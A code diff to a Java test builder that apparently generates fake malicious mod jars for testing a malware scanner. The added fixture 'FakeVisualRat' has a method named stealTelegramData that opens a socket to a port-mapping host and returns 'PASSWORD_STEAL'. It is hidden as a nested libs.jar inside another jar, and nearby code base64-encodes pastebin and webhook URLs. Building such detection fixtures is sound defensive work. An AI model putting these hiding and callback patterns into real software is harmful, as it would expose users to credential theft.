@@ -105,6 +105,16 @@ public final class TestModsBuilder {
         buildJar(outputDir, sourcesDir, classesDir, "hidden_max_10",
                 "testmods.max10", "HiddenMax10", hiddenMax10Source());
 
+        Path fakeWork = outputDir.resolve(".fake_visual_rat_work");
+        Files.createDirectories(fakeWork);
+        buildJar(fakeWork, sourcesDir, classesDir, "fake_visual_rat_inner",
+                "testmods.fakerat", "FakeVisualRat", fakeVisualRatSource());
+        byte[] fakeInner = Files.readAllBytes(
+                fakeWork.resolve("fake_visual_rat_inner.jar"));
+        createDataJar(outputDir.resolve("fake_visual_rat.jar"),
+                Map.of("assets/fake/libs.jar", fakeInner));
+        deleteTree(fakeWork);
+
         String pastebin = Base64.getEncoder().encodeToString(
                 PASTEBIN_URL.getBytes(StandardCharsets.UTF_8));
         String webhook = Base64.getEncoder().encodeToString(
@@ -372,6 +382,24 @@ public final class TestModsBuilder {
                 """.formatted(charArray(HIDDEN_WEBHOOK));
     }
 
+    private static String fakeVisualRatSource() {
+        return """
+                package testmods.fakerat;
+
+                public final class FakeVisualRat {
+                    public static String stealTelegramData() {
+                        try {
+                            java.net.Socket socket =
+                                    new java.net.Socket("example.portmap.host", 61233);
+                            socket.close();
+                        } catch (Exception ignored) {
+                        }
+                        return "PASSWORD_STEAL";
+                    }
+                }
+                """;
+    }
+
     private static String hiddenMax10Source() {
         int key = 0x2A;
         return """
@@ -541,6 +569,17 @@ public final class TestModsBuilder {
 
     private static byte[] utf8(String text) {
         return text.getBytes(StandardCharsets.UTF_8);
+    }
+
+    private static void deleteTree(Path directory) throws IOException {
+        if (!Files.exists(directory)) {
+            return;
+        }
+        try (Stream<Path> paths = Files.walk(directory)) {
+            for (Path path : paths.sorted(Comparator.reverseOrder()).toList()) {
+                Files.deleteIfExists(path);
+            }
+        }
     }
 
     private static void resetDirectory(Path directory) throws IOException {
